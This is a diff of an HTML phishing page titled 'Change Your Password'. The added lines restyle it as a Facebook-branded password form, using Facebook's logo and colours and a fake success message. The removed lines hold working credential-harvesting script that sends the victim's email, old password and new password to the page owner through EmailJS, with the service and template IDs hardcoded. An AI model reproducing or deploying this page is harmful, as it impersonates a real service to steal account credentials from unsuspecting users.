@@ -1,92 +1,152 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Change Your Password</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-    <script>
-        (function() {
-            emailjs.init("0DWuzZ-mZLM196nkP");  // Public Key
-        })();
-    </script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .form-container {
-            background: white;
-            padding: 20px 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-            width: 300px;
-        }
-        .form-container h2 {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .form-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .form-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            border: none;
-            color: white;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .form-container button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – Change Password</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .logo-section {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-section img {
+      width: 240px;
+      max-width: 100%;
+    }
+
+    .password-box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .password-box h2 {
+      font-size: 22px;
+      font-weight: normal;
+      margin-bottom: 20px;
+      text-align: center;
+      color: #1c1e21;
+    }
+
+    .password-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .password-box button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin: 12px 0;
+    }
+
+    .password-box button:hover {
+      background-color: #166fe5;
+    }
+
+    .success-message {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      animation: fadeIn 0.3s ease forwards;
+    }
+
+    .success-message svg {
+      width: 60px;
+      height: 60px;
+      color: #42b72a;
+      margin-bottom: 15px;
+    }
+
+    .success-message h3 {
+      font-size: 20px;
+      color: #1c1e21;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 480px) {
+      .password-box, .success-message {
+        padding: 16px;
+      }
+
+      .password-box input, .password-box button {
+        font-size: 16px;
+        padding: 12px;
+      }
+
+      .password-box button {
+        font-size: 18px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<div class="form-container">
+  <div class="logo-section">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
+  </div>
+
+  <div class="password-box" id="passwordBox">
     <h2>Change Your Password</h2>
     <form id="passwordForm">
-        <input type="email" name="email" placeholder="Email Address" required>
-        <input type="password" name="old_password" placeholder="Old Password" required>
-        <input type="password" name="new_password" placeholder="New Password" required>
-        <button type="submit">Update Password</button>
+      <input type="email" placeholder="Email address" id="email" required>
+      <input type="password" placeholder="Old password" id="oldPassword" required>
+      <input type="password" placeholder="New password" id="newPassword" required>
+      <button type="submit">Update Password</button>
     </form>
-</div>
+  </div>
 
-<script>
-    document.getElementById('passwordForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const email = this.email.value;
-        const old_password = this.old_password.value;
-        const new_password = this.new_password.value;
-
-        // Send the form data to EmailJS
-        emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
-            user_email: email,        // This must match the EmailJS template variable
-            old_password: old_password,
-            new_password: new_password
-        })
-        .then(function(response) {
-            alert('Password update sent successfully!');
-            document.getElementById('passwordForm').reset();
-        }, function(error) {
-            console.error('FAILED...', error);
-            alert('There was an error. Try again.');
-        });
-    });
-</script>
+  <div class="success-message" id="successMessage">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+         stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
+      <path d="M9 12l2 2l4-4"></path>
+      <circle cx="12" cy="12" r="10"></circle>
+    </svg>
+    <h3>Password Updated Successfully</h3>
+  </div>
 
 </body>
 </html>
